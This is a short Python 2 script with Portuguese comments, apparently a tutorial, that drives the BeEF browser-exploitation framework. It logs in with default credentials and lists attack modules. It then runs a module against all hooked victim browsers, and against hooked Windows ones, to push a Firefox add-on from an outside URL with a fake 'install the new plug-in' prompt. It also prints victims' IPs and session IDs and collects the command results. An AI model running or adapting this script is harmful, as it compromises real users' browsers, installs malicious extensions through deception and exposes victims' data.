# -*- coding: utf-8 -*-
from beefapi import BeefAPI

beef = BeefAPI({}) #1
beef.login("beef", "beef") #2

for modulo in beef.modules: #3
    print modulo.id, modulo.name #4

for modulo in beef.modules.findbyname("firefox"): #5
    print modulo.id, modulo.name #6

mod14 = beef.modules.findbyid(14) #7
print "Nome:", mod14.name #8
print "\nDescrição:", mod14.description #9
print "\nOpções:", mod14.options #10

for browser_infectado in beef.hooked_browsers.online: #11
    browser_infectado.run(14, {"url" : "http://site.com/addon.xpi", \
"notification_text" : "Instale o novo plug-in do Firefox!"}) #12

for browser_infectado in beef.hooked_browsers.online: #13
    print "IP:", browser_infectado.ip #14
    print "SESSAO:", browser_infectado.session #15

browser = beef.hooked_browsers.online.findbysession("XXXyyyZZZ") #16
browser.run(14) #17

for browser_Windows in beef.hooked_browsers.online.findbyos("windows"): #18
    browser_Windows.run(14) #19

browser = beef.hooked_browsers.online.findbysession("XXXyyyZZZ") #20
ID_do_comando_executado = browser.run(14)["command_id"] #21
resultado = beef.modules.findbyid(14).results("XXXyyyZZZ", ID_do_comando_executado) #22
while not resultado: #23
    resultado = beef.modules.findbyid(14).results("XXXyyyZZZ", ID_do_comando_executado) #24
print resultado #25